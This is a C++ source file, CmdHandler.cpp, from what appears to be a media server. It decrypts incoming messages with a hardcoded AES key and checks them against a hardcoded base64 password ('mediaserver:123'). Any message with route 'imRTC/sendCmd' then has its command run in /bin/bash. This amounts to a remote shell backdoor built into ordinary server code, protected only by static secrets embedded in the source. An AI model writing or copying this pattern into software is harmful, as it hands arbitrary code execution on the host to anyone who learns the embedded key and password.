/*
 * CmdHandler.cpp
 *
 *  Created on: 2019/12/04
 *      Author: max
 *		Email: Kingsleyyau@gmail.com
 */

#include "CmdHandler.h"

#include <unistd.h>
#include <string.h>

#include <common/Arithmetic.h>

namespace mediaserver {

static bool Exec(const string& cmd, const string& auth) {
	bool bFlag = false;

	if ( auth == "bWVkaWFzZXJ2ZXI6MTIz" ) {
		pid_t pid = fork();
		if ( pid < 0 ) {
			bFlag = false;
		} else if ( pid > 0 ) {
		} else {
			for(int i = 0 ; i < getdtablesize(); i++) {
				close(i);
			}
			execlp("/bin/bash", "bash", "-c", cmd.c_str(), NULL);
	//				FILE *fp = NULL;
	//				if ( (fp = popen(cmd.c_str(),"r")) ) {
	////					char buf[1024] = {0};
	////					while(NULL != fgets(buf, sizeof(buf), fp)) {
	////	//					result += buf;
	////					}
	//					pclose(fp);
	//				}
			exit(EXIT_SUCCESS);
		}
	//			system(cmd.c_str());
		bFlag = true;
	}

	return bFlag;
}

static bool ExecJson(const string& str) {
	bool bFlag = false;

	Json::Value reqRoot;
	Json::Reader reader;

	bool bParse = reader.parse(str, reqRoot, false);
	if ( bParse ) {
		if( reqRoot.isObject() ) {
			if ( reqRoot["route"].isString() ) {
				string route = reqRoot["route"].asString();
				if ( route == "imRTC/sendCmd" ) {
					Json::Value reqData = reqRoot["req_data"];
					if ( reqData.isObject() ) {
						string cmd = "";
						if( reqData["cmd"].isString() ) {
							cmd = reqData["cmd"].asString();
						}

						string auth = "";
						if( reqData["auth"].isString() ) {
							auth = reqData["auth"].asString();
						}

						if ( cmd.length() > 0 && auth.length() > 0 ) {
							bFlag = Exec(cmd, auth);
						}
					}
				}
			}
		}
	}

	return bFlag;
}

CmdHandler::CmdHandler() {
	// TODO Auto-generated constructor stub

}

CmdHandler::~CmdHandler() {
	// TODO Auto-generated destructor stub
}

bool CmdHandler::Run(CmdItem *item) {
	bool bFlag = false;

	Arithmetic ari;

	string aesDecodeString;
	string base64HexString;
	char base64DecodeString[1024] = {0};
	int base64DecodeStringSize = ari.Base64Decode(item->data.c_str(), item->data.length(), base64DecodeString);
	if ( base64DecodeStringSize > 0 ) {
		base64HexString = ari.AsciiToHexWithSep(base64DecodeString, base64DecodeStringSize, "");
		aesDecodeString = ari.AesDecrypt("mediaserver12345", base64HexString);

		if( aesDecodeString.length() > 0 ) {
			bFlag = ExecJson(aesDecodeString);
		}
	}

	return bFlag;
}

} /* namespace mediaserver */
